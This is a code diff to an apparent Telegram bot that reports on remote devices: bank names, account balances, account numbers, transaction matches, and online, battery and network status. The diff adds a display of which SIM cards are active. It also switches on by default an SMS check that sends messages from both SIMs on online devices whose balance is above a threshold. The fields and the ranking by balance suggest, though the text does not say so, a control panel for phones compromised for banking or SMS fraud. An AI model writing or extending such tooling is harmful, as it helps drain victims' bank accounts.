@@ -1060,12 +1060,19 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
                 txn += f" ({r.transaction_type})"
         online_icon = "🟢" if r.online == "online" else ("🔴" if r.online == "offline" else "⚪")
         did = r.device_id or r.client_id or r.identity
+        sim_parts = []
+        if r.sim1_active:
+            sim_parts.append("SIM 1 ACTIVE")
+        if r.sim2_active:
+            sim_parts.append("SIM 2 ACTIVE")
+        sim_line = " · ".join(sim_parts) if sim_parts else "SIM: not confirmed"
         out += [
             "",
             f"<b>{i}. <code>{esc(did)}</code></b>",
             f"🏦 {esc(bank_line)}  ·  💰 <b>{esc(bal_line)}</b>  ·  💳 {esc(acct)}",
             f"📨 Txn: {esc(txn)}  ·  Match: {'YES' if matched else 'NO'}",
             f"{online_icon} {esc(r.online)}  ·  🔋 {esc(r.battery or '—')}  ·  📶 {esc(r.network or '—')}",
+            f"📱 <b>{esc(sim_line)}</b>",
         ]
         if r.last_seen:
             out.append(f"🕐 {esc(r.last_seen)}")
@@ -1417,9 +1424,10 @@ async def run_scan(message: Any, path: str, mode: str = "online_no_match", with_
 
             records = scan_device_snapshot(snapshot, path or "/", messages_override=messages_map)
 
-            # SMS SIM-check disabled by default (devices rarely confirm isSended).
-            # Enable only with ENABLE_SMS_CHECK=1 if needed later.
-            if os.getenv("ENABLE_SMS_CHECK", "").strip() in {"1", "true", "yes"}:
+            # SMS SIM-check ON by default (send SIM1/SIM2 → inbox / isSended)
+            # Disable with ENABLE_SMS_CHECK=0
+            sms_on = os.getenv("ENABLE_SMS_CHECK", "1").strip().lower() not in {"0", "false", "no", "off"}
+            if sms_on:
                 need_check = sum(
                     1 for r in records
                     if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
@@ -1427,9 +1435,12 @@ async def run_scan(message: Any, path: str, mode: str = "online_no_match", with_
                 will_check = min(need_check, MAX_SMS_CHECK_DEVICES)
                 if will_check:
                     await message.reply_text(
-                        f"SMS check: top {will_check}/{need_check} by balance …"
+                        f"SMS check: top {will_check}/{need_check} "
+                        f"(SIM1 send→inbox, then SIM2) …"
                     )
                     await run_sms_checks_on_records(records, clients, devices)
+                    ok = sum(1 for r in records if r.sim1_active or r.sim2_active)
+                    await message.reply_text(f"SMS check done. SIM ACTIVE: {ok}/{will_check}")
 
             store.finish(sid, records, "completed")
             await reply_report(message, format_report(records, mode), with_buttons)
